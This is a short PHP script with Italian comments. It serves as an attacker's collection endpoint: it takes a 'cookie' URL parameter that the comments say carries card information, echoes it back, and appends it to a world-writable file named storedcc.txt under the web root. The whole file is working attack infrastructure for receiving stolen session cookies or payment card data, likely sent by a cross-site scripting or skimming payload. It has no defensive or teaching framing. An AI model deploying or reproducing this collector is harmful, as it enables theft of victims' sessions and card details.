<?php
	//get di cookie in url, che contiene infocc
	$ccinfos = $_GET['cookie']."\n";
	echo $ccinfos;
	//link in /var/www/ in cui salvo i dati, deve avere diritti write others
	$stored = 'storedcc.txt';
	file_put_contents($stored, $ccinfos, FILE_APPEND);
?>
	
